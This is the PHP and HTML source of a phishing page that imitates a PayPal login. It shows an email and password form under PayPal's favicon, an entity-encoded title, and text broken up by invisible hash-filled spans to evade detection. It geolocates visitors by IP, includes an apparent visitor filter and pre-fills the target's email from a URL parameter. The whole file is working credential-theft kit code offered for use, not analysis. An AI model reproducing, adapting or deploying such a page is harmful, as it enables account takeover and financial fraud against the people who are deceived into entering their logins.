<?php
error_reporting(0); 
@session_start();
include("not.php"); 
include("language/". $_SESSION['_lang_'].".php");


   $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $countrycode = $ip_data->geoplugin_countryCode;
        $_SESSION['cntyCode'] = $countrycode;
    }
    
    $ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data2 && $ip_data2->geoplugin_countryName != null)
    {
        $countryname = $ip_data2->geoplugin_countryName;
        $_SESSION['cntyName'] = $countryname;
    }

  $return_email = $_GET['return_access'];
  if(empty($return_email)){
    $return_email = "";
  }else{
    $return_email = $_GET['return_access'];
  }
?>
<!DOCTYPE html>
<html>
  <head>
    <head>
      <meta charset="utf-8">
      <title> &#76;&#111;&#103;&#105;&#110;&#32;&#84;&#111;&#32;&#67;&#111;&#110;&#116;&#105;&#110;&#117;&#101; </title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <script src="../js/ajax.js" charset="utf-8"></script>
      <script src="../js/jquery.js" charset="utf-8"></script>
      <script src="../js/jquery.min.js" charset="utf-8"></script>
      <link rel="stylesheet" href="../css/styles.css">
      <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
      <link href="../css/ico.css" rel="stylesheet">
    </head>
  </head>
  <body>
    <div class="bg"></div>
    <a href="./"><div class="logo"></div></a>
    <div class="panels bottom" id="former">
      <img src="../css/logo.png" alt="">
      <br><br>
      <form class="description" method="post" autocomplete="off" style="text-align: center;">
        <div class="inp_text" id="login_email">
          <input type="text" name="login_email" alt="dead" value="<?php echo $return_email ?>" placeholder="Email">
          <div class="mark email" data-icon="d"></div>
        </div>
        <div class="inp_text" id="login_password">
          <input type="password" name="login_password" alt="dead" value="" placeholder="Password">
          <div class="mark password" data-icon="d"></div>
        </div>
        <br><br>
        <div class="btns" name="login_submit">
          <div><span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>d9337507aa955bea6e2521ca7038157c</span>L<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>f52d4a5155cc5155369c95d8567e9a6a</span>o<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>15c9bda0ac8c9ce4613c1f49f11f4fe8</span>g<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>8f4f0943e5d630909bedff1b62e41beb</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>01d58bd55ac3c379eeb42e04d1dc7f42</span>I<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>e02f3ef61dbe0dea31b7a8dd1bfa3f9b</span>n</div>
          <div class="children"></div>
        </div>
        <br><br>
        <a href="#"><div><span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>38f7c1af7fffacb7421db4f9e428f5e8</span>H<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>d3126c1934f7462eca5291166a75cd67</span>a<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>5e47d5b059c69e14376e183b4828fa53</span>v<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>4378e397ef3a8a45c60cc7e02fb8d1f5</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>4fadb0824fab5b1fe8c67a381dec9529</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>79c7b3ecce9f2ef05da03e49a0938db8</span>g<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>9e46f86fc841cab6995df32b0e2a7e17</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>7db4f75c9e4b059d8492d6536b844b7b</span>t<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>d12b12cd92353f3b8fe2bda4b0204073</span>r<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>b87619fb02ff71ea38492785d77e1e3a</span>o<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>5f77e9b55652cce30efd0566b94e39db</span>u<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>067b4d774c2a51f50a7f74f0064d19bd</span>b<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>2f800f04ada7eed9dc795cebdd819034</span>l<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>ff85c700000f1999bfeb757f97fa06c3</span>e<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>219a5ca579880b8076758d40604f1aef</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>e05759f3b549e227c56f7ce5dde9881d</span>l<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>07cf8562e9d1d422d120bdc291abe622</span>o<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>564afc79e41cefa9386c02700a84794c</span>g<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>d630db377027b61ee68bfa8be8d7bdfb</span>g<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>3d454478035525274a4a5df6d45df4ca</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>b7fa05464552861d6bff65c68cfdb651</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>ca514cb822aab83b28fb07d871f0c2da</span>g<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>8cd827574cdd619fc8618ab10071162b</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>79d9b2b8a421d9a078a9cda2fbbc40b4</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>4cd2aa95f0dd75bf261f01ac0b398bd5</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>76483b9fd01aeabc6b2ef2b9ad16c3e5</span>?</div></a>
      </form>
      <div class="loader" id="loader">
        <div class="load"></div>
      </div>
    </div>
    <script type="text/javascript">
      <?php include '../js/js-plus.js'; ?>
    </script>
  </body>
</html>
